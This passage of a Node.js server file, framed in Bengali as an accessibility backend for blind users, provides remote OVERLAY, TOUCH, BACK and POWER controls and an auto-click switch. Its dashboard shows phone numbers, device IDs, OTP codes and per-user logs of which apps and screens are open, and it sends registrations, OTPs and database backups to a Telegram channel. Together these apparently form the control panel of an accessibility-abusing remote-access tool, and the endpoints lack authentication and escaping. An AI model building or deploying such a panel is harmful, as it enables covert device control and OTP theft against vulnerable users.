    const alertMsg = `<b>${emoji} ডাটাবেইজ পাওয়ার কমান্ড: ${updated.lastPowerCommand}</b>\n\n` +
      `⚡ <b>পাওয়ার স্ট্যাটাস:</b> ${stateText}\n` +
      `🎯 <b>অটো-ক্লিক সার্ভিস:</b> ${updated.autoClickEnabled ? 'সক্রিয়' : 'বন্ধ'}\n` +
      `📡 <b>উৎস:</b> <code>${source}</code>\n` +
      `⏰ <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}\n` +
      `<i>(দৃষ্টি প্রতিবন্ধী ব্যক্তিদের সুরক্ষা ও কার্যকারিতা সার্ভার দ্বারা নিয়ন্ত্রিত)</i>`;

    telegram.sendMessage(alertMsg, { silent: false }).catch(err => {
      console.warn('[Telegram] Power alert send error:', err.message);
    });

    res.json({
      success: true,
      message: turnOn 
        ? 'পাওয়ার অন কার্যকর করা হয়েছে। সকল অটো-ক্লিক সার্ভিস সক্রিয়।' 
        : 'পাওয়ার অফ কার্যকর করা হয়েছে। সকল অটো-ক্লিক সার্ভিস বন্ধ।',
      ...updated
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// -------------------------------------------------------------
// Filora Accessibility Remote Controls (OVERLAY, TOUCH, BACK, POWER)
// -------------------------------------------------------------
app.get('/api/controls', (req, res) => {
  try {
    const controls = db.getControls();
    res.json({
      success: true,
      controls
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/controls/:controlName', (req, res) => {
  try {
    const { controlName } = req.params;
    const { value, source = "FILORA_WEB_PANEL" } = req.body;
    const updated = db.setControl(controlName, value, source);

    // Send Telegram alert for control updates
    const isStateOn = Boolean(value);
    const label = controlName.toUpperCase();
    const alertMsg = `<b>🕹️ Filora কন্ট্রোল আপডেট: ${label} -> ${isStateOn ? 'ON' : 'OFF'}</b>\n\n` +
      `⚡ <b>কন্ট্রোল:</b> <code>${label}</code>\n` +
      `📌 <b>স্ট্যাটাস:</b> ${isStateOn ? 'সক্রিয় (ON)' : 'বন্ধ (OFF)'}\n` +
      `📡 <b>উৎস:</b> <code>${source}</code>\n` +
      `⏰ <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}`;

    telegram.sendMessage(alertMsg, { silent: true }).catch(() => {});

    res.json({
      success: true,
      message: `${label} সফলভাবে ${isStateOn ? 'অন' : 'অফ'} করা হয়েছে`,
      controls: updated
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// -------------------------------------------------------------
// Accessibility Vibration Settings Endpoints (Database Drawer)
// -------------------------------------------------------------
app.get('/api/vibration', (req, res) => {
  try {
    const vibrationSettings = db.getVibrationSettings();
    res.json({
      success: true,
      vibrationSettings
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/vibration', (req, res) => {
  try {
    const updated = db.setVibrationSettings(req.body || {});
    res.json({
      success: true,
      message: 'অ্যাক্সেসিবিলিটি ভাইব্রেশন সেটিংস ডাটাবেইজে সংরক্ষিত হয়েছে',
      vibrationSettings: updated
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// -------------------------------------------------------------
// Interactive Web Admin & API Dashboard (index.html)
// -------------------------------------------------------------
app.get(['/', '/dashboard', '/index.html'], (req, res) => {
  const publicIndexPath = path.join(__dirname, 'public', 'index.html');
  const fs = require('fs');
  if (fs.existsSync(publicIndexPath)) {
    return res.sendFile(publicIndexPath);
  }
  const rootIndexPath = path.join(__dirname, 'index.html');
  if (fs.existsSync(rootIndexPath)) {
    return res.sendFile(rootIndexPath);
  }

  const stats = db.getStats();
  const users = db.getAllUsers();
  const logs = db.getNavigationLogs(10);

  const html = `<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Accessibility Node.js Database Server</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #2563EB;
      --primary-hover: #1D4ED8;
      --success: #16A34A;
      --warning: #D97706;
      --danger: #DC2626;
      --bg: #0F172A;
      --card-bg: #1E293B;
      --card-border: #334155;
      --text: #F8FAFC;
      --text-muted: #94A3B8;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Plus Jakarta Sans', 'Hind Siliguri', -apple-system, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      line-height: 1.5;
      padding: 24px;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
    }
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 16px;
      margin-bottom: 32px;
      padding-bottom: 20px;
      border-bottom: 1px solid var(--card-border);
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 14px;
    }
    .logo-badge {
      width: 48px;
      height: 48px;
      background: linear-gradient(135deg, #2563EB, #7C3AED);
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      box-shadow: 0 8px 16px rgba(37, 99, 235, 0.3);
    }
    h1 { font-size: 24px; font-weight: 800; color: #FFFFFF; }
    .badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 6px 12px;
      background: rgba(22, 163, 74, 0.15);
      border: 1px solid rgba(22, 163, 74, 0.3);
      color: #4ADE80;
      border-radius: 9999px;
      font-size: 13px;
      font-weight: 600;
    }
    .pulse-dot {
      width: 8px;
      height: 8px;
      background: #4ADE80;
      border-radius: 50%;
      box-shadow: 0 0 10px #4ADE80;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.4; }
    }
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 18px;
      margin-bottom: 32px;
    }
    .stat-card {
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 16px;
      padding: 20px;
    }
    .stat-title {
      font-size: 13px;
      color: var(--text-muted);
      font-weight: 600;
      margin-bottom: 8px;
    }
    .stat-value {
      font-size: 32px;
      font-weight: 800;
      color: #FFFFFF;
    }
    .section-card {
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 20px;
      padding: 24px;
      margin-bottom: 32px;
    }
    .section-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }
    .section-title {
      font-size: 18px;
      font-weight: 700;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      text-align: left;
    }
    th, td {
      padding: 12px 16px;
      border-bottom: 1px solid var(--card-border);
      font-size: 14px;
    }
    th {
      color: var(--text-muted);
      font-weight: 600;
    }
    .pill {
      display: inline-block;
      padding: 4px 10px;
      border-radius: 6px;
      font-size: 12px;
      font-weight: 700;
    }
    .pill-verified { background: rgba(22, 163, 74, 0.2); color: #86EFAC; }
    .pill-pending { background: rgba(217, 119, 6, 0.2); color: #FDE68A; }
    .btn {
      background: var(--primary);
      color: #fff;
      border: none;
      padding: 8px 16px;
      border-radius: 10px;
      font-weight: 600;
      font-size: 13px;
      cursor: pointer;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 6px;
      transition: background 0.2s;
    }
    .btn:hover { background: var(--primary-hover); }
    .btn-sm { padding: 4px 10px; font-size: 12px; }
    .btn-success { background: var(--success); }
    .btn-outline {
      background: transparent;
      border: 1px solid var(--card-border);
      color: var(--text);
    }
    .btn-outline:hover { background: rgba(255,255,255,0.05); }
    .code-box {
      background: #090D16;
      border: 1px solid #1E293B;
      padding: 12px 16px;
      border-radius: 10px;
      font-family: monospace;
      font-size: 13px;
      color: #38BDF8;
      overflow-x: auto;
    }
    .grid-2 {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 24px;
    }
    @media (max-width: 768px) {
      .grid-2 { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="brand">
        <div class="logo-badge">⚡</div>
        <div>
          <h1>Accessibility Node.js Database Server</h1>
          <p style="color: var(--text-muted); font-size: 14px;">দৃষ্টি প্রতিবন্ধী ব্যক্তিদের মোবাইল অ্যাক্সেসিবিলিটি ডাটাবেজ ব্যাকএন্ড</p>
        </div>
      </div>
      <div>
        <div class="badge">
          <span class="pulse-dot"></span>
          <span>সার্ভার সচল • PORT ${PORT}</span>
        </div>
      </div>
    </header>

    <!-- Stats Row -->
    <div class="stats-grid">
      <div class="stat-card">
        <div class="stat-title">👥 মোট ইউজার (Total Users)</div>
        <div class="stat-value">${stats.totalUsers}</div>
      </div>
      <div class="stat-card">
        <div class="stat-title">✅ ভেরিফাইড ইউজার (Verified)</div>
        <div class="stat-value" style="color: #4ADE80;">${stats.verifiedUsers}</div>
      </div>
      <div class="stat-card">
        <div class="stat-title">⏳ অপেক্ষমান ভেরিফিকেশন (Pending)</div>
        <div class="stat-value" style="color: #FBBF24;">${stats.pendingUsers}</div>
      </div>
      <div class="stat-card">
        <div class="stat-title">📱 অ্যাক্সেসিবিলিটি সার্ভিস সক্রিয়</div>
        <div class="stat-value" style="color: #38BDF8;">${stats.activeServices}</div>
      </div>
    </div>

    <!-- Power & Auto-Click Control Section (/power on & /power off) -->
    <div class="section-card" style="border: 2px solid ${stats.isPowerOn ? 'rgba(34, 197, 94, 0.4)' : 'rgba(239, 68, 68, 0.4)'}; background: ${stats.isPowerOn ? 'rgba(34, 197, 94, 0.05)' : 'rgba(239, 68, 68, 0.05)'};">
      <div class="section-header">
        <div>
          <div class="section-title">⚡ ডাটাবেইজ সার্ভার পাওয়ার ও অটো-ক্লিক কন্ট্রোল (/power on & /power off)</div>
          <p style="color: var(--text-muted); font-size: 13px; margin-top: 4px;">
            দৃষ্টি প্রতিবন্ধী ব্যক্তিদের সুরক্ষা ও সুবিধার জন্য সার্ভার থেকে সরাসরি বা টেলিগ্রাম বট থেকে অটো-ক্লিক সার্ভিস নিয়ন্ত্রণ করুন
          </p>
        </div>
        <span class="pill ${stats.isPowerOn ? 'pill-verified' : 'pill-pending'}" style="font-size: 14px; padding: 6px 14px;">
          ${stats.isPowerOn ? '🟢 পাওয়ার অন (/power on) • সক্রিয়' : '🔴 পাওয়ার অফ (/power off) • অটো-ক্লিক বন্ধ'}
        </span>
      </div>

      <div style="display: flex; gap: 12px; align-items: center; flex-wrap: wrap; margin-bottom: 12px;">
        <button class="btn btn-success" style="padding: 10px 20px; font-size: 14px;" onclick="sendPowerCommand('/power on')">
          🟢 /power on (সব কার্যকর চলমান করুন)
        </button>
        <button class="btn" style="background: #EF4444; padding: 10px 20px; font-size: 14px;" onclick="sendPowerCommand('/power off')">
          🔴 /power off (সকল auto ক্লিক সার্ভিস বন্ধ করুন)
        </button>
        <button class="btn btn-outline" onclick="location.reload()">
          🔄 স্ট্যাটাস রিফ্রেশ
        </button>
      </div>

      <div style="font-size: 12px; color: var(--text-muted); background: #090D16; padding: 10px 14px; border-radius: 8px; border: 1px solid var(--card-border);">
        <strong>সর্বশেষ কমান্ড:</strong> <code>${stats.lastPowerCommand}</code> | 
        <strong>অটো-ক্লিক অবস্থা:</strong> <span style="color: ${stats.autoClickEnabled ? '#4ADE80' : '#F87171'}; font-weight: bold;">${stats.autoClickEnabled ? 'সক্রিয় (ENABLED)' : 'স্থগিত / বন্ধ (PAUSED)'}</span> | 
        <strong>টেলিগ্রাম বট কমান্ড:</strong> বটের চ্যাটে <code>/power on</code> অথবা <code>/power off</code> লিখলেও অবিলম্বে এই কার্যকর পরিবর্তিত হবে।
      </div>
      <div id="powerStatusMessage" style="font-size: 13px; margin-top: 8px; font-weight: 600;"></div>
    </div>

    <div class="grid-2">
      <!-- Android Setup Guide -->
      <div class="section-card">
        <div class="section-header">
          <div class="section-title">📲 অ্যান্ড্রয়েড অ্যাপের সাথে সংযোগ (Android Connection)</div>
        </div>
        <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 12px;">
          অ্যান্ড্রয়েড অ্যাপ থেকে এই Node.js ডাটাবেজ সার্ভারটি ব্যবহার করতে অ্যাপের <strong>ইউজার সেটিংস > Node সার্ভার</strong> অপশনে গিয়ে নিচের যেকোনো একটি URL দিন:
        </p>
        
        <div style="margin-bottom: 12px;">
          <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 4px;">অ্যান্ড্রয়েড ইমুলেটর থেকে (Android Emulator):</div>
          <div class="code-box">http://10.0.2.2:${PORT}</div>
        </div>

        <div style="margin-bottom: 12px;">
          <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 4px;">একই ওয়াই-ফাই নেটওয়ার্কের আসল মোবাইল থেকে:</div>
          <div class="code-box">http://&lt;আপনার_কম্পিউটারের_আইপি&gt;:${PORT}</div>
        </div>

        <div>
          <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 4px;">রিমোট ক্লাউড ডেপ্লয়মেন্ট (Render/Railway):</div>
          <div class="code-box">https://blind-assist-node-server.onrender.com</div>
        </div>
      </div>

      <!-- Telegram Cloud Storage & Bot Card -->
      <div class="section-card">
        <div class="section-header">
          <div class="section-title">✈️ টেলিগ্রাম ক্লাউড স্টোরেজ ও বট (Telegram Storage & Alerts)</div>
          <span class="pill ${telegram.getStatus().isEnabled ? 'pill-verified' : 'pill-pending'}">
            ${telegram.getStatus().isEnabled ? '✓ কানেক্টেড' : '⏳ কনফিগ প্রয়োজন'}
          </span>
        </div>
        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 12px;">
          দৃষ্টি প্রতিবন্ধী ব্যক্তির রেজিস্ট্রেশন, ওটিপি কোড এবং ডাটাবেজ ব্যাকআপ স্বয়ংক্রিয়ভাবে টেলিগ্রাম চ্যানেলে সংরক্ষণের জন্য বট টোকেন ও চ্যাট আইডি দিন:
        </p>

        <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 12px;">
          <input type="text" id="tgBotToken" placeholder="Telegram Bot Token (e.g. 7123456789:AA...)" 
                 value="${telegram.getStatus().botTokenMasked ? '' : ''}"
                 style="background: #090D16; border: 1px solid var(--card-border); color: #fff; padding: 8px 12px; border-radius: 8px; font-size: 13px;" />
          <input type="text" id="tgChatId" placeholder="Telegram Chat ID (e.g. -100123456789 or user ID)" 
                 value="${telegram.getStatus().chatId || ''}"
                 style="background: #090D16; border: 1px solid var(--card-border); color: #fff; padding: 8px 12px; border-radius: 8px; font-size: 13px;" />
        </div>

        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
          <button class="btn btn-sm" onclick="saveTelegramConfig()">💾 সংরক্ষণ করুন</button>
          <button class="btn btn-sm btn-outline" onclick="testTelegramPing()">⚡ টেস্ট মেসেজ পাঠান</button>
          <button class="btn btn-sm btn-success" onclick="backupToTelegram()">📦 ডাটাবেজ ব্যাকআপ পাঠান</button>
        </div>
        <div id="tgStatusMessage" style="font-size: 12px; margin-top: 8px; color: #38BDF8;"></div>
      </div>
    </div>

    <!-- Users Table -->
    <div class="section-card">
      <div class="section-header">
        <div class="section-title">📋 নিবন্ধিত ইউজার ডাটাবেজ (Registered Users in Node DB)</div>
        <button onclick="location.reload()" class="btn btn-sm btn-outline">🔄 রিফ্রেশ</button>
      </div>

      ${users.length === 0 ? '<p style="color: var(--text-muted);">কোনো ইউজার ডাটাবেজে পাওয়া যায়নি।</p>' : `
      <div style="overflow-x: auto;">
        <table>
          <thead>
            <tr>
              <th>ফোন নম্বর</th>
              <th>ডিভাইস আইডি / মডেল</th>
              <th>স্ট্যাটাস</th>
              <th>ওটিপি কোড</th>
              <th>অ্যাক্টিভ স্ক্রিন</th>
              <th>অ্যাকশন</th>
            </tr>
          </thead>
          <tbody>
            ${users.map(u => `
              <tr>
                <td><strong>${u.phoneNumber}</strong></td>
                <td>
                  <div>${u.deviceModel || 'অ্যান্ড্রয়েড ফোন'}</div>
                  <div style="font-size: 11px; color: var(--text-muted);">${u.deviceId}</div>
                </td>
                <td>
                  <span class="pill ${u.isVerified ? 'pill-verified' : 'pill-pending'}">
                    ${u.isVerified ? '✓ VERIFIED' : '⏳ PENDING'}
                  </span>
                </td>
                <td>
                  <code style="background: rgba(255,255,255,0.08); padding: 2px 6px; border-radius: 4px; font-weight: bold; color: #FBBF24;">
                    ${u.verificationCode || '123456'}
                  </code>
                </td>
                <td>
                  <span style="font-size: 13px; color: #94A3B8;">${u.lastActiveScreen || 'হোম'}</span>
                  ${u.isServiceEnabled ? '<span style="color: #4ADE80; font-size: 11px; margin-left: 6px;">● সার্ভিস অন</span>' : ''}
                </td>
                <td>
                  ${!u.isVerified ? `
                    <button class="btn btn-sm btn-success" onclick="quickVerify('${u.phoneNumber}')">ভেরিফাই করুন</button>
                  ` : '<span style="color: #4ADE80; font-size: 12px;">সম্পন্ন</span>'}
                </td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      </div>
      `}
    </div>

    <!-- Real-time Navigation Logs -->
    <div class="section-card">
      <div class="section-header">
        <div class="section-title">📡 স্ক্রিন নেভিগেশন লাইভ টেলিম্যাট্রি লগ (Screen Telemetry Logs)</div>
        <a href="/api/logs/navigation" target="_blank" class="btn btn-sm btn-outline">সব লগ দেখুন (JSON)</a>
      </div>
      ${logs.length === 0 ? '<p style="color: var(--text-muted); font-size: 14px;">অ্যাপ থেকে এখনো কোনো নেভিগেশন লগ পাঠানো হয়নি।</p>' : `
      <div style="overflow-x: auto;">
        <table>
          <thead>
            <tr>
              <th>সময়</th>
              <th>ফোন নম্বর</th>
              <th>স্ক্রিন শিরোনাম (Screen Title)</th>
              <th>প্যাকেজ নেম (App Package)</th>
            </tr>
          </thead>
          <tbody>
            ${logs.map(l => `
              <tr>
                <td style="font-size: 12px; color: var(--text-muted);">${new Date(l.timestamp).toLocaleTimeString()}</td>
                <td><strong>${l.phoneNumber}</strong></td>
                <td>${l.screenTitle}</td>
                <td><code>${l.packageName}</code></td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      </div>
      `}
    </div>

  </div>

  <script>
    async function quickVerify(phone) {
      if (!confirm('ইউজার ' + phone + ' কে সার্ভারে ভেরিফাই করতে চান?')) return;
      try {
        const res = await fetch('/api/users/' + encodeURIComponent(phone) + '/quick-verify', { method: 'POST' });
        const data = await res.json();
        if (data.success) {
          alert('সফলভাবে ভেরিফাই করা হয়েছে!');
          location.reload();
        } else {
          alert('ভেরিফিকেশন ব্যর্থ: ' + (data.message || 'Error'));
        }
      } catch (err) {
        alert('ত্রুটি: ' + err.message);
      }
    }

    async function saveTelegramConfig() {
      const botToken = document.getElementById('tgBotToken').value.trim();
      const chatId = document.getElementById('tgChatId').value.trim();
      const statusDiv = document.getElementById('tgStatusMessage');
      statusDiv.innerText = 'সংরক্ষণ করা হচ্ছে...';

      try {
        const res = await fetch('/api/telegram/config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ botToken, chatId, isEnabled: true, autoBackup: true })
        });
        const data = await res.json();
        if (data.success) {
          statusDiv.innerText = '✓ ' + data.message;
          setTimeout(() => location.reload(), 1200);
        } else {
          statusDiv.innerText = 'ত্রুটি: ' + (data.message || 'Error');
        }
      } catch (err) {
        statusDiv.innerText = 'ব্যর্থ: ' + err.message;
      }
    }

    async function testTelegramPing() {
      const botToken = document.getElementById('tgBotToken').value.trim();
      const chatId = document.getElementById('tgChatId').value.trim();
      const statusDiv = document.getElementById('tgStatusMessage');
      statusDiv.innerText = 'টেলিগ্রামে টেস্ট পিং পাঠানো হচ্ছে...';

      try {
        const res = await fetch('/api/telegram/test', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ botToken, chatId })
        });
        const data = await res.json();
        if (data.success) {
          statusDiv.innerText = '✓ ' + data.message;
        } else {
          statusDiv.innerText = 'ত্রুটি: ' + data.message;
        }
      } catch (err) {
        statusDiv.innerText = 'ব্যর্থ: ' + err.message;
      }
    }

    async function sendPowerCommand(cmd) {
      const statusDiv = document.getElementById('powerStatusMessage');
      if (statusDiv) statusDiv.innerHTML = '<span style="color: #38BDF8;">কমান্ড প্রক্রিয়াকরণ হচ্ছে...</span>';

      try {
        const res = await fetch('/api/power', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command: cmd, source: 'DASHBOARD_UI' })
        });
        const data = await res.json();
        if (data.success) {
          if (statusDiv) {
            const color = data.isPowerOn ? '#4ADE80' : '#F87171';
            statusDiv.innerHTML = '<span style="color: ' + color + ';">✓ ' + data.message + ' (' + data.lastPowerCommand + ')</span>';
          }
          setTimeout(() => location.reload(), 1000);
        } else {
          if (statusDiv) statusDiv.innerHTML = '<span style="color: #F87171;">ত্রুটি: ' + (data.message || 'Error') + '</span>';
        }
      } catch (err) {
        if (statusDiv) statusDiv.innerHTML = '<span style="color: #F87171;">ব্যর্থ: ' + err.message + '</span>';
      }
    }

    async function backupToTelegram() {
      const statusDiv = document.getElementById('tgStatusMessage');
      statusDiv.innerText = 'ডাটাবেজ ফাইল টেলিগ্রামে আপলোড হচ্ছে...';

      try {
        const res = await fetch('/api/telegram/backup', { method: 'POST' });
        const data = await res.json();
        if (data.success) {
          statusDiv.innerText = '✓ ' + data.message;
        } else {
          statusDiv.innerText = 'ত্রুটি: ' + data.message;
        }
      } catch (err) {
        statusDiv.innerText = 'ব্যর্থ: ' + err.message;
      }
    }
  </script>
</body>
</html>`;

  res.send(html);
});

// Start Server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`====================================================`);
  console.log(`🚀 Accessibility Node.js Database Server Started!`);
  console.log(`📡 URL: http://localhost:${PORT}`);
  console.log(`📱 Android Emulator URL: http://10.0.2.2:${PORT}`);
  console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
  console.log(`====================================================`);

  // Start Telegram bot command listener (/power on, /power off)
  telegram.startPolling(db);

  // CLI command listener from database server console/terminal
  try {
    const readline = require('readline');
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
      terminal: false
    });

    rl.on('line', (line) => {
      const text = line.trim().toLowerCase();
      if (text === '/power on' || text === 'power on' || text === '/on' || text === 'on') {
        const updated = db.setPowerStatus(true, "SERVER_CLI");
        console.log(`[Database Server] 🟢 /power on executed! All auto-click services activated. Status: ${updated.lastPowerCommand}`);
        telegram.sendMessage(`<b>🟢 ডাটাবেইজ সার্ভার কনসোল থেকে /power on কার্যকর করা হয়েছে</b>\n\n⚡ সকল দৃষ্টি প্রতিবন্ধী অটো-ক্লিক ও সার্ভিস সক্রিয় রয়েছে।`).catch(() => {});
      } else if (text === '/power off' || text === 'power off' || text === '/off' || text === 'off') {
        const updated = db.setPowerStatus(false, "SERVER_CLI");
        console.log(`[Database Server] 🔴 /power off executed! All auto-click services paused/stopped. Status: ${updated.lastPowerCommand}`);
        telegram.sendMessage(`<b>🔴 ডাটাবেইজ সার্ভার কনসোল থেকে /power off কার্যকর করা হয়েছে</b>\n\n⚠️ সকল দৃষ্টি প্রতিবন্ধী অটো-ক্লিক সার্ভিস অবিলম্বে বন্ধ রাখা হয়েছে।`).catch(() => {});
      } else if (text === '/status' || text === 'status') {
        const p = db.getPowerStatus();
        console.log(`[Database Server Status] Power: ${p.isPowerOn ? 'ON' : 'OFF'}, AutoClick: ${p.autoClickEnabled ? 'ENABLED' : 'DISABLED'}, LastCommand: ${p.lastPowerCommand}`);
      }
    });
    console.log('[Database Server] CLI ready: Type /power on or /power off in console to toggle auto-click.');
  } catch (err) {
    console.warn('[Database Server] CLI listener initialization skipped:', err.message);
  }
});
